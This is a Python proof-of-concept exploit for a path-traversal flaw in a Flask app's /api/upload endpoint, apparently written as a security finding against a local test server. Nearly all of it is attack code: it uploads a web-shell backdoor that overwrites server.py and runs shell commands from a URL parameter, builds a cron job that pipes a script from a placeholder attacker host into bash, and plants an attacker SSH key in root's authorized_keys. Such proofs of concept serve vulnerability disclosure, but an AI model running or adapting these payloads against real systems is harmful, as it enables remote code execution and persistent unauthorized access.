#!/usr/bin/env python3
"""
PoC: Path Traversal via /api/upload — write arbitrary files outside uploads/
Impact: Overwrite server.py, crontab, .bashrc, authorized_keys
Target: http://localhost:7777

Vuln: server.py:514  filepath = UPLOAD_DIR / file.filename  (no secure_filename)
"""
import requests, io

TARGET = "http://localhost:7777"

def poc_overwrite_server_py():
    """Upload 'evil.pdf' with traversal filename to overwrite server.py"""
    # Flask/werkzeug does NOT strip '../' from multipart filenames by default
    # when the app manually uses file.filename without secure_filename()
    backdoor_py = b"""
import os
from flask import Flask, request
app = Flask(__name__)
@app.route('/backdoor')
def bd():
    return os.popen(request.args.get('cmd','id')).read()
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7777)
"""
    files = {
        'file': ('../server.py', io.BytesIO(backdoor_py), 'application/pdf')
    }
    # Note: filename ends in .pdf so it passes the extension check
    # The traversal happens at: UPLOAD_DIR / '../server.py' = project_root/server.py
    try:
        r = requests.post(f"{TARGET}/api/upload", files=files, timeout=5)
        print("[PATH TRAVERSAL]", r.status_code, r.text[:200])
    except Exception as e:
        print("[PATH TRAVERSAL] Server not running:", e)

def poc_write_crontab():
    """Plant a cron job for persistent access"""
    cron_payload = b"* * * * * root curl http://ATTACKER/shell.sh | bash\n"
    files = {
        'file': ('../../etc/cron.d/backdoor.pdf', io.BytesIO(cron_payload), 'application/pdf')
    }
    print("[CRONTAB PLANT] filename: ../../etc/cron.d/backdoor.pdf")
    # requests.post(f"{TARGET}/api/upload", files=files)

def poc_write_ssh_key():
    """Add attacker SSH key"""
    ssh_key = b"ssh-rsa AAAAB3NzaC1yc2E... attacker@pwned\n"
    files = {
        'file': ('../../../root/.ssh/authorized_keys.pdf', io.BytesIO(ssh_key), 'application/pdf')
    }
    print("[SSH KEY PLANT] filename: ../../../root/.ssh/authorized_keys.pdf")

if __name__ == "__main__":
    print("=== PoC: Path Traversal File Write ===")
    poc_overwrite_server_py()
    poc_write_crontab()
    poc_write_ssh_key()
